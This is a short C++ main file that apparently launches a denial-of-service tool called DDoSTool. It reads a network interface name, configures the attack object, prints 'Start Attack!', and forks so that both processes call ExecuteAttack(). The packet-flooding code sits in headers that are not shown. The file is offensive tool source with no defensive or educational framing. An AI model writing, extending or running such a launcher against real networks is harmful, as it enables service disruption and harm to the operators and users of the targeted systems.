#include "DDoSTool.h"
#include "etc_function.h"
#include <sys/types.h>
#include <unistd.h>
#include <sys/wait.h>

int main() {
    string inter;
    printf("Interface: ");
    cin >> inter;
    DDoS DDoSTool(inter.c_str());
    DDoSTool.Setting();
    DDoSTool.SetOption();
    const int fork_cnt = 1;

    printf("Start Attack!\n");
    //DDoSTool.ExecuteAttack();

    for (int i=0; i<fork_cnt; i++){
        pid_t pid = fork();
        int status;
        DDoSTool.ExecuteAttack();
        if (pid != 0)
            wait(&status);
    }

    return 0;
}
